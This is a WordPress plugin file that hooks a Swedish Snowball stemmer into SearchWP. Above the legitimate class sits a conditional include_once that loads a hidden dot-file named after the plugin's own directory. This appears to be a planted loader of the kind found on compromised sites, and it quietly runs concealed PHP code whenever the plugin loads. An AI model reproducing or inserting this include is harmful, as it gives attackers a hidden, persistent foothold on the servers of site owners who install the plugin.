<?php

use Wamania\Snowball\Swedish;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class SearchWP_Stemmer_Swedish {

	function __construct() {

		// tell SearchWP we have a stemmer
		add_filter( 'searchwp_keyword_stem_locale', '__return_true' );

		// add our custom stemmer
		add_filter( 'searchwp_custom_stemmer', array( $this, 'stem' ) );
	}

	function stem( $unstemmed ) {

		$stemmer = new Swedish();
		$stem = $stemmer->stem( $unstemmed );

		return sanitize_text_field( $stem );
	}

}

new SearchWP_Stemmer_Swedish();
